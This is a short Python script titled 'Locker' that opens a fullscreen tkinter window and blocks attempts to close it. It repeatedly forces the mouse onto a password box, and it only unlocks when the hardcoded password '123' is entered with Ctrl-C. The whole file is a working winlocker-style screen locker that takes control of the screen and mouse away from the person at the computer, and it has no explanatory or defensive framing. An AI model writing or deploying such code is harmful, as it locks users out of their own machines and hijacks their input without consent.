from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global k, entry
    k = entry.get() == '123'

def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)

root = Tk()
root.title("Locker")
root.attributes('-fullscreen', True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=600, y=400)
label = Label(root, text="Write the password and press C-c", font="Arial 20")
label.place(x=470, y=300)
root.update()
sleep(0.2)
click(675, 420)
k = False
while not k:
    on_closing()
